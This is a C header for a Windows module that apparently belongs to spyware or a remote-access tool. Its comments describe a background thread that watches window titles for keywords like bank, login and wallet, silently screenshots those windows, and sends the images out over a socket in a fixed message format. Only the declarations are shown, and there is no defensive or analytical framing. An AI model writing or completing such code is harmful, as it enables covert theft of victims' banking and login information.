#ifndef WINDOW_MONITOR_H
#define WINDOW_MONITOR_H

#include <winsock2.h>
#include <windows.h>

// Starts a background thread that watches the foreground window title.
// When a high-value keyword is detected (bank, login, wallet, etc.),
// a screenshot is taken silently and sent as:
//   AUTO_SCREENSHOT|<escaped_title>|<b64size>|<base64jpeg>\n
void StartWindowMonitor(SOCKET sock);

// Signals the monitor thread to stop and waits for it to exit.
void StopWindowMonitor();

#endif // WINDOW_MONITOR_H
